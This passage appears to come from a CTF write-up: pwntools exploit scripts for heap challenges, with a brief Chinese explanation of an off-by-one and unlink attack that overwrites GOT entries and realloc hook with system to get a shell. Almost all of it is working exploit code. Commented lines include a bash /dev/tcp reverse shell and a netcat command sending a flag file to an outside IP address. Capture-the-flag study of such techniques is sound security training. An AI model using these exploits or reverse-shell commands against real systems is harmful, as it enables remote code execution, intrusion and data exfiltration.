    info('a heap pointer: %#x', a_heap_ptr)

    io.sendlineafter('(A)dd', 'S')
    low = (a_heap_ptr + 0x30) & 0xffffffff
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(low), 128) + p8(0x20))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.recvline_endswith('ff600800 punches')
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)
    show_addr = unpack(leaked, 'all')
    elf.address = show_addr - 0xB30
    info('show address: %#x', show_addr)
    info('elf base address: %#x', elf.address)

    io.sendlineafter('(A)dd', 'S')
    low = elf.got['puts'] & 0xffffffff
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(low), 128) + p8(0xa8))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    high = elf.got['puts'] >> 32
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(high), 128) + p8(0xac))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul(cyclic(0x10), ljust('\0', 128) + p8(0xb8))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)
    puts_addr = unpack(leaked, 'all')
    info('puts address: %#x', puts_addr)
    libc.address = puts_addr - libc.symbols['puts']
    info('libc base address: %#x', libc.address)

    # io.sendlineafter('(A)dd', 'S')
    # low = libc.symbols['system'] & 0xffffffff
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(low), 128) + p8(0xa8))
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    # io.sendlineafter('(A)dd', 'S')
    # high = libc.symbols['system'] >> 32
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(high), 128) + p8(0xac))
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    # raw_input('press to get shell!')
    # io.sendlineafter('(A)dd', 'S')
    # add_role_vul(cyclic(0x10), ljust('/bin/sh\0', 128) + p8(0xc0))

    io.sendlineafter('(A)dd', 'S')
    low = libc.symbols['system'] & 0xffffffff
    addr = elf.got['strlen'] - 0x18
    add_role_vul(
        cyclic(0x10), ljust('{:d}'.format(low), 128) + pack(addr, 'all'))
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendline('/bin/sh')
    """
    io.sendlineafter('(A)dd', 'S')
    # add_role_vul('1')
    add_role_vul('\0'.ljust(128) + p8(0x14))

    io.clean(1)
    # TODO: remember to modify
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0x30000055), 128) + p8(0x1d))
    # add_role(cyclic(0x10), ljust('{:d}'.format(0x62000000), 128) + p8(0x1e))
    # raw_input('continue?')
    # gdb.attach(io, gdbscript='''
    # #''')

    io.recvline_endswith('punches')
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)

    show_addr = unpack(leaked, 'all')
    base_addr = show_addr - 0xB30
    info('show addres: %#x', show_addr)
    info('elf base address: %#x', base_addr)
    """

    io.interactive()


if __name__ == '__main__':
    while True:
        try:
            exploit()
        except Exception as err:
            pass
"""
set *(char *)($rbp - 0x1a0 + 128 + 1) = 0x90
c

set *(long long *)0x00005555557560e0=0x0000555555769080
set *(long long *)0x00005555557560e8=0x0000555555769080
set *(long long *)0x00005555557560f0=0x0000555555769080
set *(long long *)0x00005555557560f8=0x0000555555769080
set *(long long *)0x0000555555756100=0x0000555555769080
set *(long long *)0x0000555555756108=0x0000555555769080
b *0x0000555555554DFF
dq 0x00005555557560E0 10

d br 1
d br 2
"""
```

## note

（脑残眼瞎了，当做开了 PIE 做的。。。

修改 title 可以 off by 1，仅可以选择（0x0a 0x21 0x3f 0x40 0x22 0x27 0x23 0x26），其中只有 0x40 可以作为下一个的大小来做 unlink。

首先第一次修改 content 布局，然后修改 title 将 content chunk size 改成 0x40，然后修改 content 利用 realloc 触发 free，此时 content 进了 fastbin 没有 merge 产生 unlink。

然后第三次修改 content 大小为足够大触发 consolidate，使得 unlink 触发，将 title 指向 bss。

通过修改 title 完全控制 bss，进而产生任意读写，最后将 realloc hook 改成 system。

```python
#!/usr/bin/env python
# coding:utf-8

# ./exploit.py LIBC=libc-2.23.so MODE=remote
# flag{t1-1_1S_0_sImPl3_n0T3}

from ctf import *

binary = './note'
# context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)


def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('39.107.14.183', 1234)
        # io = remote('10.132.141.60', 1234)
        # io = remote('39.107.14.183', 6666)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = remote('0', 1234)

    def change_title(title):
        io.sendlineafter(">>\n", "1")
        io.sendafter("title:", title)

    def change_content(size, content):
        io.sendlineafter(">>\n", "2")
        io.sendlineafter("):", str(size))
        if len(content) < size:
            content += '\n'
        io.sendafter("content:", content)

    def change_comment(comment):
        io.sendlineafter(">>\n", "3")
        comment += '\n'
        io.sendafter('comment:', comment)

    def show_content():
        io.sendlineafter(">>\n", "4")
        io.recvuntil('is:')
        return io.recvuntil('\n1.', drop=True)

    # leak = show_content()
    # leak = leak.ljust(8, '\x00')
    # leak = u64(leak)
    # libc.address = leak - 0x3c4b78
    # info('libc address: %#x', libc.address)

    change_content(0x78, fit({
        0x38: 0x21,
        0x58: 0x21,
    }))
    # io.interactive()

    change_title(
        flat(
            'A' * 8,
            0x25,
            0x602070 - 0x18,
            0x602070 - 0x10,
            0x20,) + '\x40')

    change_content(0x100, 'B')
    change_content(0x21000, 'C')
    #io.interactive()

    change_title(cyclic(0x18) + '\x40')
    change_title(flat('A' * 0x20, elf.got['puts']) + '\n')
    io.sendlineafter(">>\n", "4")
    io.recvuntil('is:')
    puts_addr = unpack(io.recvline(keepends=False), 'all')  # 0x00000000023ca6e0
    libc.address = puts_addr - libc.symbols['puts']
    info('puts address: %#x', puts_addr)
    info('libc base address: %#x', libc.address)
    io.unrecv('\n')
    # print '=' * 100

    # change_title(cyclic(0x18) + '\x0a')
    # change_title(flat('\0' * 0x16, 'A' * 0x20, elf.got['puts']) + '\n')
    change_title(flat('A' * 0x18, 0x602010) + '\n')
    change_comment('\xcc\0')
    # io.interactive()

    # change_title(flat('A' * 0x20, libc.address + 0x3c4ba8) + '\n')
    change_title(
        flat('A' * 0x20, libc.address + 0x3c4b78) + '\xcc')  # small bins
    # io.interactive()
    # show_content()
    io.sendlineafter(">>\n", "4")
    io.recvuntil('is:')
    # print 'fuck' * 100
    # print io.recvline(keepends=False)
    a_heap_ptr = unpack(
        io.recvline(keepends=False),
        'all')  # 0x00000000023ca6e0 0x0000000001b056e0
    a_heap_ptr = a_heap_ptr - 0x90 + 0xcb
    # a_heap_ptr = 0x6020cb
    info('a heap pointer: %#x', a_heap_ptr)
    # change_title(p64(libc.address + 0x3C3FD0, 'all') + '\n')
    # change_content(0x80 - 8, flat('A' * 0x30, 0x40, 0x41, 'A' * 0x38) + "\n")

    change_title(flat('A' * 0x18, a_heap_ptr) + '\xcc')
    # change_comment(';echo flag | nc 0 12345')
    # change_comment(';echo flag | nc 139.224.220.67 12345')
    # change_comment(';/bin/bash -c "echo flag > /dev/tcp/139.224.220.67/12345"')
    # change_comment(';cat flag >&4')
    # change_comment(';while [ 1 ]; do echo 1; done')
    # change_comment(';cat flag')
    change_comment(';sh')
    # change_comment(';bash -c "exec 9<> /dev/tcp/139.224.220.67/12345;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;"')

    change_title(flat('A' * 0x20, a_heap_ptr) + '\xcc')
    std_err = libc.address + 0x3c5540
    # std_err_t = std_err - 0x40
    change_title(flat(std_err, 'A' * 0x8, 0, libc.address + 0x3C4B08) + '\xcc')
    # change_title('\x40')
    # io.interactive()
    info('system address: %#x', libc.symbols['system'])
    change_comment(flat(libc.symbols['system']))
    # change_comment(flat(0x401307))
    # change_comment(flat(0x40130C))

    io.sendlineafter(">>\n", "2")
    io.sendline('1')

    # change_title(
    #     flat(
    #         0,
    #         0x20,
    #         0x602070 - 0x18,
    #         0x602070 - 0x10,
    #         0x20,).ljust(0x28, 'A') +
    #     '\x40')  # 0x0a 0x21 0x3f 0x40 0x22 0x27 0x23 0x26

    # gdb.attach(io, '''
    # ''')
    '''
    dq 0x0000000000602050
    '''

    io.interactive()


if __name__ == '__main__':
    exploit()
```
